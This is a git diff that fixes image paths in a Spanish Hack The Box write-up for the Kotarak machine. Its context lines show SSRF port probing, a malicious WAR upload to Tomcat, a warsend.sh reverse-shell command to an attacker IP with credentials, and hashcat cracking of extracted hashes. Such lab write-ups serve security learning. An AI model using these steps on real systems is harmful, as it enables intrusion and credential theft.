@@ -3,7 +3,7 @@ title: "Kotarak - WriteUp"
 date: Thu Jul 17 2025 19:45:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Linux]
 tags: [ctf, nmap, htb, msfvenom, ssh, cve, exploit, cve-2016-4971, bash, hashcat]
-image: /assets/img/htb-writeups/Pasted image 20240207195006.png
+image: /assets/img/htb-writeups/Pasted-image-20240207195006.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20240207195006.png
   platform="HTB"
 %}
 
-![Kotarak](/assets/img/htb-writeups/Pasted image 20240207195006.png)
+![Kotarak](/assets/img/htb-writeups/Pasted-image-20240207195006.png)
 
 ---
 
@@ -22,7 +22,7 @@ Tags:
 
 ----------
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240207195006.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240207195006.png)
 
 #### INFO
 Kotarak se centra en muchos vectores de ataque diferentes y requiere bastantes pasos para completarse. Es una gran experiencia de aprendizaje ya que muchos de los temas no están cubiertos por otras máquinas en Hack The Box.
@@ -69,25 +69,25 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 HTTP puerto 8080
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208121423.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208121423.png)
 
 Como es un Apache Tomcat sabemos que en la ruta `manager/html` suele haber un panel de login, comprobémoslo:
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208121603.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208121603.png)
 
 Y efectivamente lo tiene. Probamos credenciales por defecto pero no tenemos suerte. Seguimos enumerando.
 
 HTTP puerto 60000
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208122117.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208122117.png)
 
 Si introducimos por ejemplo 127.0.0.1 y le damos a "Submit" no nos lleva a nada pero nos llama la atención la URL:
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208122458.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208122458.png)
 
 Podemos intentar un LFI jugando con path traversal...
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208122312.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208122312.png)
 
 Habrá que intentar más cosas... :)
 
@@ -107,15 +107,15 @@ $ php -S localhost:8081
 
 Introducimos la URL de nuestro equipo con el puerto y le damos a Submit:
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208123500.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208123500.png)
 
 Pero no hace nada...
 
 Probamos URL contra si misma y obtenemos respuesta:
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208124425.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208124425.png)
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208124444.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208124444.png)
 
 Y funciona...
 
@@ -142,21 +142,21 @@ Puerto 3306
 http://10.129.1.117:60000/url.php?path=http://localhost:3306
 ```
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208131707.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208131707.png)
 
 Puerto 320
 ```http
 http://10.129.1.117:60000/url.php?path=http://localhost:320
 ```
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208131012.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208131012.png)
 
 Puerto 888
 ```http
 http://10.129.1.117:60000/url.php?path=http://localhost:888
 ```
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208131141.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208131141.png)
 
 Si pulsamos sobre los dos enlaces que contienen datos, como _backup_ o _tetris.c_ vemos que nos redirige de la siguiente manera:
 
@@ -176,7 +176,7 @@ http://10.129.1.117:60000/url.php?path=http://localhost:888?doc=backup
 
 Aparentemente no nos sale nada pero si activamos el modo "ver el código fuente" de la página...
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208142601.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208142601.png)
 
 Bingo! tenemos unas credenciales!
 
@@ -190,7 +190,7 @@ Ahora nos vamos al login que habíamos encontrado en el puerto 320 e introducimo
 http://10.129.1.117:8080/manager/html
 ```
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208143933.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208143933.png)
 
 Una vez aquí vamos a intentar ganar acceso mediante un archivo .WAR malicioso.
 
@@ -203,11 +203,11 @@ $ zip -r backup.war cmd.jsp
 
 Una vez creado nos vamos "WAR file to deply" y subimos el archivo WAR.
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208151131.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208151131.png)
 
 Ahora vamos a la URL http://10.129.1.117:8080/backup/cmd.jsp
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208151226.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208151226.png)
 
 Y ya tenemos ejecución remota de comandos para enviarnos una reverse shell.
 
@@ -231,13 +231,13 @@ Descargamos el script de https://github.com/thewhiteh4t/warsend y lo ejecutamos 
 $ ./warsend.sh 10.10.14.135 4444 10.129.1.117 8080 admin '3@g01PdhB!' revshell
 ```
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208152922.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208152922.png)
 
 Y Estamos dentro!
 
 Dentro de la carpeta del usuario tomcat vemos los siguientes archivos:
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208163320.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208163320.png)
 
 Nos lo traemos a nuestra máquina para extraer los hashes con _scretsdump_ y los renombramos a ntds.bin y ntds.dit para un manejo más cómodo.
 
@@ -312,9 +312,9 @@ $ hashcat -m 1000 hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/
 
 Y en un momento tenemos las contraseñas...
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208165814.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208165814.png)
 
-![KOTARAK](/assets/img/htb-writeups/Pasted image 20240208170459.png)
+![KOTARAK](/assets/img/htb-writeups/Pasted-image-20240208170459.png)
 
 ```http
 CREDS:
